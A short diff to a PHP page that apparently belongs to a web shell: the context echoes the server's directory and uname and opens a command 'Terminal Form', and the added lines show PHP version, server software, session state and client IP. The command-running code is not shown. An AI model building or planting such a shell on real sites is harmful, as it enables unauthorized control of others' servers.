@@ -918,6 +918,15 @@ url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBT
         <p><?php echo $current_dir; ?></p>
         <p><?php echo $uname; ?></p>
 
+        <!-- Add PHP information section -->
+    <div style="margin: 20px; padding: 10px; background-color: rgba(255, 255, 255, 0.8); border-radius: 5px;">
+        <h2>PHP Information</h2>
+        <p><strong>PHP Version:</strong> <?php echo phpversion(); ?></p>
+        <p><strong>Server Software:</strong> <?php echo $_SERVER['SERVER_SOFTWARE']; ?></p>
+        <p><strong>Session Status:</strong> <?php echo isset($_SESSION['loggedin']) ? 'Logged In' : 'Logged Out'; ?></p>
+        <p><strong>Client IP Address:</strong> <?php echo $_SERVER['REMOTE_ADDR']; ?></p>
+    </div>
+
         <!-- Terminal Form -->
         <p class="mt-3 font-weight-bold"><i class="fa-solid fa-terminal"></i>
         <form method="POST">
